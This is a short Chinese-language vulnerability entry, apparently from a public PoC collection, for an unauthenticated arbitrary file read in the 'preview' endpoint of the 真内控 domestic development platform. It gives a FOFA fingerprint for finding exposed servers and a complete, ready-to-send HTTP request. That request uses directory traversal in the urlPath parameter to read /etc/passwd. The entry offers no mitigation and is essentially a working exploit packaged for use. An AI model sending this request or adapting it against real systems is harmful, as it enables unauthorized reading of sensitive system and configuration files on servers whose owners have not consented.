## 真内控国产化开发平台接口preview任意文件读取漏洞

真内控国产化平台 preview接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。导致系统处于极不安全的状态。

## fofa

```
body="js/npm.echarts.js"
```

## poc

```
GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20240621183258115](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211832171.png)